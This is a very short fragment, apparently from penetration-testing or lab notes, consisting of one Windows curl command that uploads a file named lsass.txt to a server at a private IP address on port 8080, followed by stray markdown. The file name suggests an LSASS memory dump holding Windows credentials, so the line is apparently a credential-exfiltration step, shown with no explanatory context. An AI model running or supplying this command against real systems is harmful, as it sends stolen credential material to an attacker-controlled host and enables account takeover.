curl.exe http://10.10.13.14:8080/lsass.txt --upload-file lsass.txt
```
---
